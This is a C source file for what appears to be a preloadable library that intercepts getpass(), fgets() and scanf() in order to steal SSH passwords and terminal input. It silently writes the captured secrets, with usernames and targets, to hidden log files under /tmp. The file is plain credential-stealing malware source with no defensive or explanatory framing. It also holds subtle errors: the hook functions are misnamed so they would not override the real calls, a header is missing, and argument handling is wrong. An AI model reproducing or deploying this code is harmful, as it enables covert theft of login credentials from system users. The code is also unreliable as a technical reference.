#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <unistd.h>
#include <time.h>
#include <pwd.h>
#include <sys/types.h>

#define CRED_LOG "/tmp/.ssh_creds.log"
#define DEBUG_LOG "/tmp/.ssh_hook_debug.log"

static int (*orig_main)(int, char**, char**) = NULL;
static char* (*orig_getpass)(const char*) = NULL;
static int (*orig_scanf)(const char*, ...) = NULL;
static char* (*orig_fgets)(char*, int, FILE*) = NULL;

void log_credential(const char* type, const char* username, const char* password, const char* target) {
    FILE* log = fopen(CRED_LOG, "a");
    if (!log) return;
    
    time_t now = time(NULL);
    char* timestamp = ctime(&now);
    timestamp[strlen(timestamp) - 1] = '\0';
    
    fprintf(log, "[%s] SSH_%s: user=%s, pass=%s, target=%s, pid=%d\n", 
            timestamp, type, username ? username : "unknown", 
            password ? password : "unknown", target ? target : "unknown", getpid());
    fclose(log);
}

void debug_log(const char* message) {
    FILE* log = fopen(DEBUG_LOG, "a");
    if (!log) return;
    
    time_t now = time(NULL);
    char* timestamp = ctime(&now);
    timestamp[strlen(timestamp) - 1] = '\0';
    
    fprintf(log, "[%s] PID=%d: %s\n", timestamp, getpid(), message);
    fclose(log);
}

char* extract_username_from_args(int argc, char** argv) {
    for (int i = 1; i < argc - 1; i++) {
        if (strcmp(argv[i], "-l") == 0 && i + 1 < argc) {
            return argv[i + 1];
        }
        if (strstr(argv[i], "@") != NULL) {
            char* at_pos = strstr(argv[i], "@");
            *at_pos = '\0';
            return argv[i];
        }
    }
    
    struct passwd* pw = getpwuid(getuid());
    return pw ? pw->pw_name : "unknown";
}

char* extract_target_from_args(int argc, char** argv) {
    for (int i = 1; i < argc; i++) {
        if (argv[i][0] != '-' && strchr(argv[i], '@')) {
            return strchr(argv[i], '@') + 1;
        } else if (argv[i][0] != '-' && i > 1) {
            return argv[i];
        }
    }
    return "unknown";
}

char* hooked_getpass(const char* prompt) {
    debug_log("getpass() intercepted");
    
    if (!orig_getpass) {
        orig_getpass = dlsym(RTLD_NEXT, "getpass");
    }
    
    char* password = orig_getpass(prompt);
    
    if (password && strlen(password) > 0) {
        debug_log("Password captured via getpass()");
        log_credential("GETPASS", "current_user", password, "ssh_target");
    }
    
    return password;
}

char* hooked_fgets(char* str, int n, FILE* stream) {
    if (!orig_fgets) {
        orig_fgets = dlsym(RTLD_NEXT, "fgets");
    }
    
    char* result = orig_fgets(str, n, stream);
    
    if (result && stream == stdin && strlen(result) > 1) {
        result[strlen(result) - 1] = '\0';
        
        debug_log("Input captured via fgets()");
        log_credential("FGETS", "current_user", result, "ssh_target");
        
        result[strlen(result)] = '\n';
    }
    
    return result;
}

int hooked_scanf(const char* format, ...) {
    debug_log("scanf() intercepted");
    
    if (!orig_scanf) {
        orig_scanf = dlsym(RTLD_NEXT, "scanf");
    }
    
    va_list args;
    va_start(args, format);
    
    if (strstr(format, "%s")) {
        char* str_arg = va_arg(args, char*);
        int result = orig_scanf(format, str_arg);
        
        if (result > 0 && strlen(str_arg) > 0) {
            debug_log("String input captured via scanf()");
            log_credential("SCANF", "current_user", str_arg, "ssh_target");
        }
        
        va_end(args);
        return result;
    }
    
    va_end(args);
    va_start(args, format);
    int result = orig_scanf(format, args);
    va_end(args);
    
    return result;
}

__attribute__((constructor))
void ssh_hook_init() {
    debug_log("SSH credential hook initialized");
    
    if (!orig_getpass) {
        orig_getpass = dlsym(RTLD_NEXT, "getpass");
    }
    if (!orig_fgets) {
        orig_fgets = dlsym(RTLD_NEXT, "fgets");
    }
    if (!orig_scanf) {
        orig_scanf = dlsym(RTLD_NEXT, "scanf");
    }
}